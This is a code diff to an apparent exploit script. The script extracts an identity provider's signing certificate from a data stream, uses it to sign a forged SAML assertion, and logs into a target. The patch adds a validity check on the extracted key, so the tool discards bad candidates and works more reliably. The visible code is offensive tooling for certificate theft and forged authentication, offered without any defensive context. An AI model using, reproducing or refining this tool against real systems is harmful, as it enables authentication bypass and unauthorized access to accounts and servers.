@@ -100,6 +100,12 @@ def writekey(bytes, verbose):
     
     return key
 
+def check_key_valid(key):
+    lines = key.splitlines()
+    if lines[1].startswith('MI'):
+        return True
+    else:
+        return False
 
 def get_idp_cert(stream, verbose=False):
     tup = stream.findall(idp_cert_flag, bytealigned=True)
@@ -110,12 +116,15 @@ def get_idp_cert(stream, verbose=False):
         if flag == b'\x00\x01\x04':
             size_hex = stream.read('bytes:1')
             size_hex = b'\x04' + size_hex
-            size = int(size_hex.hex(), 16) 
+            size = int(size_hex.hex(), 16)
             cert_bytes = stream.read(f'bytes:{size}')
             if any(not_it in cert_bytes for not_it in not_it_list):
                 continue
 
             key = writekey(cert_bytes, verbose)
+            if not check_key_valid(key):
+                continue
+ 
             print('[*] Successfully extracted the IdP certificate')        
             return key
     else:
@@ -262,3 +271,4 @@ if __name__ == '__main__':
     t = fill_template(hostname, args.target, req)
     s = sign_assertion(t, trusted_cert_1, trusted_cert_2, idp_cert)
     c = login(args.target, s)
+
